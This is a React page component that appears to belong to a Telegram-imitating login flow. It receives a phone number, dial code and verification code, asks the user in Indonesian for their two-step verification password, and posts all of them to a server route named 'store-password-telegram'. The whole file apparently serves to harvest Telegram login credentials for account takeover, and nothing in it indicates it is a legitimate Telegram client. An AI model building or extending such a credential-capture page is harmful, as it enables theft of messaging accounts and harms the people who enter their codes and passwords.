import { Link, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect } from "react";

export default function GetPassword({ getPhone, getDialCode, getVerif }) {
    const { data, setData, post } = useForm({
        phone: getPhone,
        dial_code: getDialCode,
        code: getVerif,
        password: "",
    });

    const changeHandler = (e) => {
        setData({ ...data, password: e.target.value });
    };

    const submitHandler = () => {
        post(route("rhmt.store-password-telegram"));
    };

    return (
        <div className="w-full h-screen px-8 flex flex-col items-center  py-16">
            <img src="download (1).png" alt="" className="" />
            <p className="mt-5 font-bold text-xl mb-4">Password</p>
            <p className="text-xs text-center w-[80%] mb-5">
                Silahkan masukkan password verifikasi 2 langkah anda jika memang
                dimiliki
            </p>
            <TextField
                onChange={changeHandler}
                id="outline-basic"
                variant="outlined"
                label="Password"
                className="w-[80%]"
                size="small"
                type="password"
            />
            <button
                onClick={submitHandler}
                className="bg-blue-500 text-white py-3 my-5 rounded-lg w-[80%]"
            >
                Login
            </button>
        </div>
    );
}
